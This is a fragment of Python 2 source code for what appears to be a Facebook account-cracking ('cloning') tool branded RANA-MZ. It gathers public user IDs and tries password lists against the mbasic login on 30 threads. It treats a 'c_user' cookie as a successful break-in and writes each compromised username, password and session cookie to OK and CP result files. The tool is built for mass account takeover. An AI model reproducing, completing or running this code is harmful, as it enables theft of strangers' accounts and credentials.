...
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'Mey', 'June', 'July', 'Agust', 'September', 'Oktober', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
...
bulan_ttl = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'Mey', '06': 'June', '07': 'July', '08': 'Agust', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'December'}
...
def moch_yayan():
    ...
    try:
        ...
        print '\n %s[%s\xc3\x97%s] TOKEN IS INVLD' % (N, M, N)
        time.sleep(2)
    ...
    print '\x1b[1;91m'
    print '      (\x1b[0;91m\xe2\x80\xa2\x1b[0m) TOKEN ID : %s' % nama
    time.sleep(0.03)
    print '      (\x1b[0;91m\xe2\x80\xa2\x1b[0m) YOUR IP   : %s' % IP
    print '\x1b[1;91m'
    os.system('echo -e "\n\n    [1]    ADD PUBLIC ID " | lolcat')
    os.system('echo -e "\n\n    [2]    GET ALL IDZ PUBLIC OR FILE " | lolcat')
    os.system('echo -e "_________________________________________________________________"| lolcat')
    os.system('echo -e "_________________________________________________________________"| lolcat')
    pepek = raw_input('\n CHOSE : ')
    if pepek == '':
        print '\n %s[%s\xc3\x97%s] WRONG!' % (N, M, N)
        time.sleep(2)
        moch_yayan()
        teman(kontol)
    elif pepek in ('1', '1'):
...
def publik(kontol):
    ...
    try:
        csy = raw_input('\n %s[%s?%s] ID LINK  : ' % (N, O, N))
        ahh = raw_input(' %s[%s?%s] NAME  : ' % (N, O, N))
        ihh = raw_input(' %s[%s?%s] LIMT   : ' % (N, O, N))
        ...
        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] DONE ...!' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] COPY NAME \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, M, knt, N)
        print 50 * '_'
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            print '\n %s[%s\xc3\x97%s] File [%s%s%s]  FILE NOT FOUND.' % (N, M, N, M, self.apk, N)
            raw_input('\n [%s ENTER%s ] ' % (O, N))
            moch_yayan()
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                ...
                print '\r  %s RANA-MZ{OK} %s|%s|%s                 %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('RANAMZ/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
                ...
                try:
                    ...
                    print '\r  %s RANA-MZ{CP} %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('RANAMZ/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                ...
                print '\r  %s RANA-MZ{CP} %s|%s                %s' % (K, user, pw, N)
    ...
    def __pler__(self):
        yan = raw_input('\n [*] ENTER KEY FOR STRT CLONING : ')
        if yan == '':
            print '\n %s[%s\xc3\x97%s] KEY : ' % (N, M, N)
            self.__pler__()
        elif yan in ('rANAMZ', 'rANAMZ'):
            os.system('echo -e "\n\n                       PLEASE WAIT....." | lolcat')
            os.system('echo -e "----------------------------------------------------------------------"| lolcat')
            os.system('echo -e "\n\n               IF SPED IS SLOW ON)OF AROPLNE MODE" | lolcat')
            os.system('echo -e "----------------------------------------------------------------------"| lolcat')
            with YayanGanteng(max_workers=30) as (__yayanXD__):
